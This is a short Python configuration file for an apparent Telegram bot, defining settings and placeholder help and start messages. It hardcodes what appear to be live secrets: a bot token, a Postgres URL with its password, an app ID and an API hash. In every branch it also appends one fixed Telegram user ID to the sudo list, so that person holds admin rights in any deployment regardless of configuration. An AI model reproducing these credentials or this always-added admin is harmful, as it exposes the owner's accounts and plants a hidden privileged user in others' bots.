import os

class Config():
  ENV = bool(os.environ.get('ENV', False))
  if ENV:
    BOT_TOKEN = os.environ.get("BOT_TOKEN", None)
    DATABASE_URL = os.environ.get("DATABASE_URL", None)
    APP_ID = os.environ.get("APP_ID", 6)
    API_HASH = os.environ.get("API_HASH", None)
    SUDO_USERS = list(set(int(x) for x in os.environ.get("SUDO_USERS").split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))
  else:
    BOT_TOKEN = "1304499146:AAGDfKIXCpgCEQt1YbTvid7mntDYPd8Qf-4"
    DATABASE_URL = "postgres://bfobzhglaspdre:faf698e11c68ed50ae10da3e577c0498720186b33478119838d29d9bd6af3f1b@ec2-52-2-82-109.compute-1.amazonaws.com:5432/d4ev2004mgdtqa"
    APP_ID = "1990511"
    API_HASH = "a4c5ee4c231eaf12c54a891381819acf"
    SUDO_USERS = list(set(int(x) for x in ''.split()))
    SUDO_USERS.append(939425014)
    SUDO_USERS = list(set(SUDO_USERS))


class Messages():
      HELP_MSG = [
        ".",

        "**rusak**"
      ]

      START_MSG = "**p [{}](tg://user?id={})**\n__rusak"
